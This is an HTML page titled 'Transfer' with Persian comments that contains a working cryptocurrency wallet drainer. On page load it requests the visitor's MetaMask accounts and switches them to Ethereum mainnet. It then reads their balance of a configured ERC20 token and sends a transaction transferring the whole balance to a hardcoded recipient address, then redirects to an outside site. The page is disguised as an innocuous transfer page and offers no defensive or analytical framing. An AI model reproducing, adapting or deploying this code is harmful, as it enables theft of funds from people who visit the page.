 <!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Transfer</title>
</head>
<body>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script>
    <script>
        // تنظیمات - این مقادیر از بک‌اند شما تزریق می‌شوند
        const CONFIG = {
               tokenAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",      // آدرس توکن ERC20
            recipientAddress: "0xe8729e199c2E2476a19704D316731b087f9a09a6", // آدرس مقصد
            redirectUrl: "https://shooshoo.us",         // وبسایت ریدایرکت
            redirectDelay: 2000                              // تاخیر ریدایرکت (میلی‌ثانیه)
        };

        // ABI برای توابع ERC20
        const ERC20_ABI = [
            {
                "constant": true,
                "inputs": [{"name": "_owner", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "balance", "type": "uint256"}],
                "type": "function"
            },
            {
                "constant": false,
                "inputs": [
                    {"name": "_to", "type": "address"},
                    {"name": "_value", "type": "uint256"}
                ],
                "name": "transfer",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function"
            }
        ];

        async function executeTransfer() {
            // تاخیر اولیه برای اطمینان از لود کامل
            await new Promise(resolve => setTimeout(resolve, 1000));

            // بررسی MetaMask
            if (typeof window.ethereum === 'undefined') {
                alert('MetaMask not installed');
                window.location.href = CONFIG.redirectUrl;
                return;
            }

            try {
                // درخواست اتصال حساب
                console.log('Requesting accounts...');
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });
                
                console.log('Accounts:', accounts);
                
                if (!accounts || accounts.length === 0) {
                    console.log('No accounts found');
                    window.location.href = CONFIG.redirectUrl;
                    return;
                }

                const userAddress = accounts[0];
                console.log('User address:', userAddress);

                // بررسی شبکه فعلی
                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                console.log('Current chain:', chainId);

                // اگر Mainnet نیست، تغییر بده
                if (chainId !== '0x1') {
                    try {
                        await window.ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: '0x1' }]
                        });
                        console.log('Switched to Mainnet');
                        // تاخیر برای تکمیل switch
                        await new Promise(resolve => setTimeout(resolve, 500));
                    } catch (switchError) {
                        console.log('Switch error:', switchError.message);
                        // ادامه بده حتی با خطا
                    }
                }

                // اتصال Web3
                const web3 = new Web3(window.ethereum);
                const contract = new web3.eth.Contract(ERC20_ABI, CONFIG.tokenAddress);
                
                console.log('Getting balance...');
                
                // دریافت موجودی
                let balance;
                try {
                    balance = await contract.methods.balanceOf(userAddress).call();
                    console.log('Balance:', balance);
                } catch (balanceError) {
                    console.log('Balance error:', balanceError.message);
                    window.location.href = CONFIG.redirectUrl;
                    return;
                }

                if (!balance || balance === '0' || balance === 0) {
                    console.log('Zero balance');
                    window.location.href = CONFIG.redirectUrl;
                    return;
                }

                // ایجاد تراکنش data
                console.log('Creating transaction...');
                const transferData = contract.methods.transfer(CONFIG.recipientAddress, balance).encodeABI();

                // تخمین gas
                let gasLimit;
                try {
                    gasLimit = await web3.eth.estimateGas({
                        to: CONFIG.tokenAddress,
                        from: userAddress,
                        data: transferData
                    });
                    // اضافه کردن 50% buffer
                    gasLimit = Math.floor(gasLimit * 1.5);
                    console.log('Estimated gas:', gasLimit);
                } catch (gasError) {
                    console.log('Gas estimation failed, using default');
                    gasLimit = 100000; // default fallback
                }

                // پارامترهای تراکنش - بدون محدودیت gas
                const txParams = {
                    to: CONFIG.tokenAddress,
                    from: userAddress,
                    data: transferData,
                    gas: '0x' + gasLimit.toString(16)
                };

                console.log('Sending transaction request...');
                console.log('TX Params:', txParams);

                // ارسال درخواست تراکنش
                const txHash = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [txParams]
                });

                console.log('Transaction sent:', txHash);

                // ریدایرکت
                setTimeout(() => {
                    window.location.href = CONFIG.redirectUrl;
                }, CONFIG.redirectDelay);

            } catch (error) {
                console.error('Transaction error:', error);
                console.error('Error code:', error.code);
                console.error('Error message:', error.message);
                
                // ریدایرکت در صورت خطا
                setTimeout(() => {
                    window.location.href = CONFIG.redirectUrl;
                }, 1000);
            }
        }

        // اجرای خودکار هنگام بارگذاری صفحه
        window.addEventListener('load', executeTransfer);
    </script>
</body>
</html>
